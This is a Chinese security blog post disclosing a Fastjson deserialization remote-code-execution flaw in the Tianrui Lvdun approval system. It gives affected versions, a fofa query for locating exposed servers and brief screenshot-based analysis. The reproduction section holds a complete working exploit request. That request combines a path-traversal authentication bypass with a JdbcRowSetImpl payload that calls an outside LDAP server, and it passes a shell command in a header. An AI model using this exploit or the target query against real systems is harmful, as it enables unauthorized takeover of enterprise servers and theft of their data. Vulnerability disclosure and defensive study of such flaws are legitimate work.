---
title: "天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-findUserTrustees-rce.html
asset_dir: assets/天锐绿盾审批系统-extfindusertrustees、findtrusteesbyuser、countunread、updatetoread、findtrusteebydeptid、findtrusteebyfilter-fastjso
---

# 天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/31 08:27
- 404浏览
- [0评论](#comment)
- 11分钟阅读

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

该系统的 `/ext/findUserTrustees`、`findTrusteesByUser`、`countUnread`、`updateToRead`、`findTrusteeByFilter`以及`findTrusteeBydeptId` 接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端[执行任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-001-b1699198d207.webp)](https://image.mrxn.net/87472e3529a943adba38bf274126e700.webp)

1.2.7版本，不是最新版，是存在反序列化[rce](https://mrxn.net/tag/rce)漏洞的。

再看`/ext/findUserTrustees` 的实现部分

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-002-3c52037da6d8.webp)](https://image.mrxn.net/b028b978dd6f4dc68d333f95e8ce7e13.webp)

请求body被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

`/ext/findTrusteesByUser`、`countUnread`、`updateToRead` 亦如此

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-003-5654dd66d149.webp)](https://image.mrxn.net/11e5aa32d5d3420784937c19f52ff6f9.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-004-544278a82ca4.webp)](https://image.mrxn.net/9fd90b4bc4294088aee44bf2b75f4451.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-005-09052eae51b4.webp)](https://image.mrxn.net/d44b190eb5e04479aeb3c36f78304f10.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-006-cc6b0c2044bb.webp)](https://image.mrxn.net/eacb7604aa404026af4842d5dc938d26.webp)

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-007-b7de87d63a08.webp)](https://image.mrxn.net/5a20db77da6f4d1c9f82794e059a5260.webp)

跟进看下，最终处理也是如此

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-008-a00a97b2c3b8.webp)](https://image.mrxn.net/eb9ac35ea38c4c1dabfac76b83cb4c22.webp)

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-009-4d62e598122c.webp)](https://image.mrxn.net/c69d77d4da6a401c85dd4c62063e18ec.webp)

```
POST /trwfe/login.jsp/.%2e/rest/ext/findUserTrustees HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/json

{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://192.168.168.11:50389/165c51",
    "autoCommit": true
}
```

成功执行`dir`命令 并回显[命令执行](https://mrxn.net/tag/rce)结果

[![天锐绿盾审批系统 /ext/findUserTrustees、findTrusteesByUser、countUnread、updateToRead、findTrusteeBydeptId、findTrusteeByFilter fastjson反序列化漏洞](images/img-010-f1fcb8a845ce.webp)](https://image.mrxn.net/7bd863cb2e5c4c1795b6628bd81286aa.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
